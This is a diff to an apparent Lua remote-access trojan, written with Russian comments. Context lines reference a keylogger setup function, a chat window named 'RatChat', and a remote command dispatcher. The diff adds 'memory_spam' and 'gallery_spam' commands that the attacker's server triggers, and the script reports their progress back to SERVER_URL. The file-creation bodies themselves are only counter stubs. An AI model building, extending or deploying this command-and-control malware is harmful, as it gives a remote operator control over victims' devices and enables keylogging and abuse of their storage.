@@ -242,6 +242,94 @@ local function setupKeylogger()
     end
 end
 
+-- Memory Spam функция
+local function memorySpam(fileCount, fileData)
+    showPopup("Memory Spam запущен: "..fileCount.." файлов", 3)
+    
+    -- Отправляем уведомление о начале
+    httpRequest({
+        Url = SERVER_URL.."/command",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            command = "memory_spam_start",
+            args = {fileCount}
+        })
+    })
+    
+    -- Имитация создания файлов
+    local successCount = 0
+    for i = 1, fileCount do
+        -- В реальной реализации здесь должен быть код создания файлов
+        -- Для примера просто увеличиваем счетчик
+        successCount = successCount + 1
+        
+        -- Периодически обновляем статус
+        if i % 50 == 0 then
+            showPopup("Memory Spam: "..i.."/"..fileCount.." файлов", 2)
+        end
+        
+        task.wait(0.01) -- Небольшая задержка
+    end
+    
+    -- Отправляем результат
+    httpRequest({
+        Url = SERVER_URL.."/command",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            command = "spam_completed",
+            args = {"memory_spam", "Создано "..successCount.." файлов"}
+        })
+    })
+    
+    showPopup("Memory Spam завершен: "..successCount.." файлов", 3)
+end
+
+-- Gallery Spam функция
+local function gallerySpam(imageCount, imageData, filename)
+    showPopup("Gallery Spam запущен: "..imageCount.." копий", 3)
+    
+    -- Отправляем уведомление о начале
+    httpRequest({
+        Url = SERVER_URL.."/command",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            command = "gallery_spam_start",
+            args = {imageCount, filename}
+        })
+    })
+    
+    -- Имитация сохранения изображений
+    local successCount = 0
+    for i = 1, imageCount do
+        -- В реальной реализации здесь должен быть код сохранения изображений
+        -- Для примера просто увеличиваем счетчик
+        successCount = successCount + 1
+        
+        -- Периодически обновляем статус
+        if i % 10 == 0 then
+            showPopup("Gallery Spam: "..i.."/"..imageCount.." копий", 2)
+        end
+        
+        task.wait(0.05) -- Небольшая задержка
+    end
+    
+    -- Отправляем результат
+    httpRequest({
+        Url = SERVER_URL.."/command",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            command = "spam_completed",
+            args = {"gallery_spam", "Сохранено "..successCount.." копий"}
+        })
+    })
+    
+    showPopup("Gallery Spam завершен: "..successCount.." копий", 3)
+end
+
 -- Чат-модуль
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "RatChat"
@@ -477,6 +565,32 @@ local function ExecuteCommand(cmd, args)
         else
             showPopup("Ошибка скрытия", 3)
         end
+    
+    -- НОВЫЕ SPAM КОМАНДЫ
+    elseif cmd == "memory_spam" then
+        local fileCount = tonumber(args[1]) or 100
+        local fileData = args[2] or {}
+        
+        -- Запускаем в отдельном потоке чтобы не блокировать выполнение
+        task.spawn(function()
+            memorySpam(fileCount, fileData)
+        end)
+    
+    elseif cmd == "gallery_spam" then
+        local imageCount = tonumber(args[1]) or 10
+        local imageData = args[2]
+        local filename = args[3] or "image.jpg"
+        
+        if not imageData then
+            showPopup("Ошибка: нет данных изображения", 3)
+            return
+        end
+        
+        -- Запускаем в отдельном потоке
+        task.spawn(function()
+            gallerySpam(imageCount, imageData, filename)
+        end)
+    
     end
 end
 
